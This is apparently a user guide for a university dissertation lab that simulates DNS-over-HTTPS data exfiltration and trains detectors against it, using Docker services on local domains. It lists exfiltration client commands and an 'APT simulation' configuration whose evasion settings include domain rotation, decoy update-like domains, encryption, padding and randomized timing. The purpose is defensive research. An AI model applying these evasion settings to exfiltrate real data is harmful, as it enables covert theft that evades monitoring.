# User Guide

## 🚀 Getting Started

This guide will walk you through setting up and using the DoH Exfiltration Detection Platform step by step.

## 📋 Prerequisites

### System Requirements
- **Operating System**: Linux, macOS, or Windows with WSL2
- **Memory**: 4GB RAM minimum, 8GB recommended
- **Storage**: 10GB free space minimum
- **CPU**: 2+ cores recommended for ML training

### Required Software
```bash
# Docker (20.10+)
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Docker Compose (v2.0+)
sudo apt-get install docker-compose-plugin  # Ubuntu/Debian
# or
brew install docker-compose                 # macOS
```

### Network Requirements
- Internet access for Docker image downloads

## 🔧 Installation

### Step 1: Clone Repository
```bash
git clone https://github.com/AdamLBS/Kent-Dissertation.git
cd Kent-Dissertation
```

### Step 2: Generate TLS Certificates
```bash
# Make script executable
chmod +x generate_certs.sh

# Generate self-signed certificates
./generate_certs.sh

# Verify certificates are created
ls -la certs/
```

Expected output:
```
certs/
├── doh.local.crt
├── doh.local.key
└── tls.yml
```

### Step 3: Start Infrastructure
```bash
# Start all services in background
docker compose up -d

# Monitor startup logs
docker compose logs -f
```

### Step 4: Verify Installation
```bash
# Check all services are running
docker compose ps

# Should show all services as "Up" or "Up (healthy)"
```

Expected services:
- `traefik` - Reverse proxy and TLS termination
- `doh_server` - DNS-over-HTTPS server
- `resolver` - DNS resolver backend
- `client_test` - Testing environment
- `exfil_interceptor` - Traffic capture
- `traffic_analyzer` - DoH analysis
- `exfil_client` - Exfiltration client

## 🧪 Basic Testing

### Test 1: DoH Server Connectivity
```bash
# Test basic DoH functionality
docker exec -it client_test bash /scripts/test_doh.sh
```

Expected output:
```
Valid DNS response
```

### Test 2: DNS Resolution
```bash
# Test direct DNS queries
docker exec -it client_test bash /scripts/test_dns_direct.sh
```

## 📊 Using the Detection System

### Starting Detection
Detection runs automatically when services start. To monitor:

```bash
# View detection logs
docker logs -f exfil_interceptor

# View traffic analysis logs
docker logs -f traffic_analyzer
```

### Viewing Results
```bash
# List captured exfiltration attempts
ls -la exfiltration/server/captured/

# List traffic analysis results
ls -la traffic_analyzer/output/

# View reconstructed data
cat exfiltration/server/captured/exfiltrated_*.txt
```

### Real-time Monitoring
```bash
docker compose logs doh_server -f
```

## 🎯 Running Exfiltration Tests

### Configuration Management

The platform uses JSON-based configuration files for flexible test scenarios.

#### Generate Configurations
```bash
cd exfiltration/client/

# Create new configuration interactively
python config_generator.py --create

# Create template configurations
python config_generator.py --templates

# List available configurations
python config_generator.py --list
```

#### Available Configuration Templates
- **Quick Test**: Basic validation configuration
- **Stealth Research**: Advanced evasion techniques
- **Speed Benchmark**: Maximum speed testing
- **APT Simulation**: Advanced persistent threat simulation

### Running Exfiltration Tests

#### Using Configuration Files

Theses commands must be run from the `exfiltration/client/` directory and on the exfil_client container.
In order to pop a shell in the container, run:
```bash
docker exec -it exfil_client bash
```
```bash
# Run with specific configuration
python run_client.py --config test_configs/apt_simulation.json

# Test configuration before running
python config_generator.py --test apt_simulation.json

# Run with custom file
python run_client.py --config quick_test.json --file custom_data.txt
```

#### Configuration Examples

**APT Simulation Example:**
```json
{
  "name": "APT Simulation",
  "description": "Simulation d'APT avec exfiltration très lente et discrète",
  "exfiltration_config": {
    "doh_server": "https://doh.local/dns-query",
    "target_domain": "update-service.local",
    "chunk_size": 8,
    "encoding": "base32",
    "timing_pattern": "random",
    "base_delay": 30.0,
    "delay_variance": 15.0,
    "compression": true,
    "encryption": true,
    "encryption_key": "apt_long_term_key",
    "subdomain_randomization": true,
    "domain_rotation": true,
    "backup_domains": [
      "security-updates.local",
      "maintenance-api.local", 
      "status-check.local"
    ],
    "padding": true,
    "padding_size": 20
  },
  "test_files": [
    "financial_records.xlsx",
    "employee_data.csv"
  ],
  "detection_expected": false,
  "notes": "Simulation APT : très lents délais, rotation domaines, chiffrement"
}
```

### Configuration Parameters

#### Timing Patterns
- **`regular`**: Fixed intervals
- **`random`**: Random delays with variance
- **`burst`**: Rapid bursts with pauses
- **`stealth`**: Adaptive timing to avoid detection

#### Encoding Methods
- **`base64`**: Standard Base64 encoding
- **`base32`**: Base32 encoding (DNS-safe)
- **`hex`**: Hexadecimal encoding
- **`custom`**: Custom encoding scheme

#### Evasion Techniques
- **Domain Rotation**: Use multiple domains
- **Subdomain Randomization**: Random subdomain patterns
- **Compression**: Reduce data size
- **Encryption**: Encrypt data chunks
- **Padding**: Add noise to confuse detection

### Automated Test Scenarios

#### Test Suite Execution
```bash
# Run all predefined tests
docker exec -it exfil_client bash /app/run_test_suite.sh
```

#### Custom Test Configurations
```bash
# Test different chunk sizes
for size in 10 20 30 40; do
    python3 client.py --chunk-size $size exfiltrate /tmp/test.txt
done

# Test different encodings
for encoding in base64 hex base32; do
    python3 client.py --encoding $encoding exfiltrate /tmp/test.txt
done
```

## 🤖 Machine Learning Analysis

### Dataset Preparation

**Using CIRA-CIC-DoHBrw-2020 Dataset:**
```bash
# 1. Download the CIRA-CIC-DoHBrw-2020 dataset
# Source: https://www.unb.ca/cic/datasets/dohbrw-2020.html

# 2. Extract CSV files to datasets directory
mkdir -p datasets/
# Place the downloaded CSV files in datasets/
# Expected files: CSV files containing network flow features

# 3. Verify dataset structure
head -5 datasets/*.csv
# Should contain columns like: Duration, FlowBytesSent, PacketLengthMean, Label, etc.
```

### Training Models
```bash
# Enter ML analyzer container
docker exec -it exfil_client bash

# Navigate to ML directory
cd /ml

# Quick training (limited dataset)
python3 model_trainer.py --quick

# Full training (complete dataset using CIRA-CIC-DoHBrw-2020)
python3 model_trainer.py
```

### Using Trained Models
```bash
# Run prediction on new data
python3 predictor.py --model random_forest --input /path/to/network_data.csv

# Analyze detection results
python3 predictor.py --analyze /traffic_analyzer/output/
```

### Model Performance
```bash
# View training reports
ls -la /ml_reports/
cat /ml_reports/random_forest_report.txt

# Check model files
ls -la /models/
```

## 📈 Data Analysis

### Flow Analysis with DoHLyzer
```bash
# Enter DoHLyzer container
docker exec -it traffic_analyzer bash

# Analyze captured pcap files
python3 /app/DoHLyzer/analyzer/main.py --input /app/output

# Generate visualizations
python3 /app/DoHLyzer/visualize_results.py
```

### Traffic Pattern Analysis
```bash
# Examine traffic patterns
cd traffic_analyzer/output/

# View flow summaries
head -n 20 output.csv

# Filter suspicious flows
grep -E "(exfill|suspicious)" output.csv
```

### Export Results
```bash
# Export detection results
docker cp exfil_interceptor:/app/captured ./detection_results/

# Export ML models
docker cp exfil_client:/models ./trained_models/

# Export traffic analysis
docker cp traffic_analyzer:/app/output ./traffic_analysis/
```

## 🔧 Configuration Customization

### Domain Configuration
```bash
# Edit docker-compose.yml
TARGET_DOMAIN=your-domain.local
DOH_DOMAINS=doh.local,your-domain.local
```

### Detection Sensitivity
```python
# Edit exfiltration/server/server.py
DETECTION_THRESHOLD = 0.8  # Adjust sensitivity
CHUNK_TIMEOUT = 30        # Seconds to wait for chunks
```

### ML Model Selection
```bash
# Choose specific model for detection
export DEFAULT_MODEL=gradient_boosting

# Adjust training parameters
export QUICK_MODE=false
export MAX_SAMPLES=50000
```

## 🛠️ Troubleshooting

### Common Issues

#### Services Not Starting
```bash
# Check Docker daemon
sudo systemctl status docker

# Check port availability
sudo netstat -tlpn | grep -E ":(80|443|8080)\s"

# Restart services
docker compose down
docker compose up -d
```

#### DoH Server Not Responding
```bash
# Check certificate validity
openssl x509 -in certs/doh.local.crt -text -noout

# Verify DNS resolution
docker exec client_test nslookup doh.local

# Check Traefik configuration
docker logs traefik
```

#### Detection Not Working
```bash
# Verify network capture
docker exec exfil_interceptor tcpdump -i any -c 10

# Check interface detection
docker exec exfil_interceptor ip link show

# Review detection logs
docker logs exfil_interceptor --tail 50
```

#### Performance Issues
```bash
# Check resource usage
docker stats

# Increase memory limits in docker-compose.yml
mem_limit: 2g

# Scale detection services
docker compose up -d --scale traffic_analyzer=2
```

### Debug Mode
```bash
# Enable verbose logging
export LOG_LEVEL=DEBUG

# Restart with debug
docker compose down
docker compose up -d

# Monitor detailed logs
docker compose logs -f | grep -E "(DEBUG|ERROR)"
```

### Reset Environment
```bash
# Complete reset
docker compose down -v
docker system prune -f
rm -rf exfiltration/server/captured/*
rm -rf traffic_analyzer/output/*
rm -rf models/*

# Restart fresh
docker compose up -d
```

## 📚 Advanced Usage

### Custom Exfiltration Techniques
```python
# Implement custom encoding
class CustomEncoder:
    def encode(self, data):
        # Your custom encoding logic
        return encoded_data

# Use with custom configuration
# Edit configuration to specify custom encoding
python config_generator.py --edit custom_encoding.json
```

### Custom Detection Rules
```python
# Add custom pattern detection in server.py
def custom_pattern_detector(query_name):
    # Your detection logic
    if suspicious_pattern(query_name):
        return True
    return False

# Register with detection system
detection_system.add_custom_detector(custom_pattern_detector)
```

### Integration with External Tools
```bash
# Export to Wireshark
tcpdump -i any -w capture.pcap
wireshark capture.pcap

# Integration with SIEM
curl -X POST http://siem-server/api/alerts \
     -d @detection_alert.json

# Export to Splunk
./export_to_splunk.sh /app/captured/
```

## 🎓 Learning Resources

### Understanding DoH Exfiltration
1. Study the client implementation in `exfiltration/client/client.py`
2. Analyze detection patterns in `exfiltration/server/server.py`
3. Review ML features in `ml_analyzer/model_trainer.py`

### Experimentation Ideas
- Test different chunk sizes and encodings
- Implement new evasion techniques
- Develop improved detection algorithms
- Create custom ML features

### Educational Exercises
1. **Basic**: Modify chunk size and observe detection changes
2. **Intermediate**: Implement new encoding method
3. **Advanced**: Develop ML-based detection improvement
4. **Expert**: Create real-time detection dashboard

## 📞 Getting Help

### Log Analysis
```bash
# Collect all logs for support
mkdir debug_logs
docker compose logs > debug_logs/compose.log
docker logs exfil_interceptor > debug_logs/interceptor.log
docker logs traffic_analyzer > debug_logs/analyzer.log
```

### System Information
```bash
# Gather system info
docker version > debug_logs/docker_version.txt
docker compose version > debug_logs/compose_version.txt
uname -a > debug_logs/system_info.txt
```

### Community Support
- GitHub Issues: Technical problems and bug reports
- GitHub Discussions: Usage questions and ideas
- Documentation: Comprehensive guides and references
